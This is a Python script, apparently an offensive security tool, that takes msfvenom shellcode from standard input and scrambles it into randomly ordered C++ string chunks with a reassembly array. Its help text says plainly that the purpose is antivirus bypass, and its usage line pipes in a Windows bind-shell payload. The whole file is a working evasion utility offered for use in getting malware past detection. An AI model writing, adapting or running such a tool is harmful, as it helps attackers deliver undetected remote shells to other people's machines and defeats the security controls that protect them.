#!/usr/bin/env python3

# Import block
from random import randrange
from sys import stdin
import argparse

# Argument parser setup
parser = argparse.ArgumentParser(prog='scramblePayload', description='[*] Shellcode is recieved from STDIN from msfvenom and is chunked. Scrambled shellcode is presented for antivirus bypass.', usage='msfvenom -p windows/shell_bind_tcp LPORT=[PORT] -f hex | ./randPayload.py -c [CHUNK SIZE] -vn [C++ VARIABLE NAME]')
parser.add_argument('-c', help='Give the size of the chunks you want the payload broken into. the smaller the better for AV bypass rates', type=int)
parser.add_argument('-vn', help='Give the name of the variable you want for your C++ based code')
args = parser.parse_args()


def randPayload(hexString, chunkSize, varName):
    """
    Chunk the string into sets of bytes. Note that we have to use the 
    chunkSize*2 in slicing to ensure that we are getting the correct number
    of bytes. 1 byte = 2 char in the string.
    """
    chunked = [hexString[i:i+(2*chunkSize)] for i in range(0, len(hexString), 2*chunkSize)]

    """
    Next we will create a dict that gives us the order of the chunks with an index. 
    Each byte will be prepended with \\x which will be needed in the output.
    """
    fixedChunk = {}
    part = 1
    for chunk in chunked:
        tempStr = ''
        for byte in [chunk[i:i+2] for i in range(0, len(chunk), 2)]:
            tempStr += str('\\x') + byte
        fixedChunk[part] = tempStr
        part = part + 1
    
    print('\n[*] The remaining input is formatted for use in C++ application development:\n')
    print("// This is the declaration and definition of all of the strings for our payload out of order")
    # Randomly pick chunks of the shellcode to print until there are none left
    chosenList = []
    while len(chosenList) < len(fixedChunk):
        key = randrange(1, len(fixedChunk)+1)
        if key not in chosenList:
            chosenList.append(key)
            print('string ' + varName + 'P' + str(key) + ' = \"' + fixedChunk[key] + '\";' )
    # Create the list that will be used to create the string* array 
    arrList = [('string* ' + varName + 'Arr[' + varName + 'ChunkCount] = { ')]
    for i in range(1, len(fixedChunk)+1, 1):
        if i < len(fixedChunk):
            arrList.append('&' + varName + 'P' + str(i) + ', ')
        else:
            arrList.append('&' + varName + 'P' + str(i) + ' };')

    print('const static int ' + varName + 'ChunkCount = ' + str(len(fixedChunk)) + ';')
    print(''.join(arrList))
    print('int ' + varName + 'Len = ' + str(int(len(hexString)/2)) + ';')




if __name__ in "__main__":
    # Take the inputs and assign them to their proper variables
    payloadHex = ""
    for line in stdin:
        payloadHex += line 
    payloadName = args.vn
    chunkSize = args.c

    # Call the randPayload function
    randPayload(payloadHex, chunkSize, payloadName)

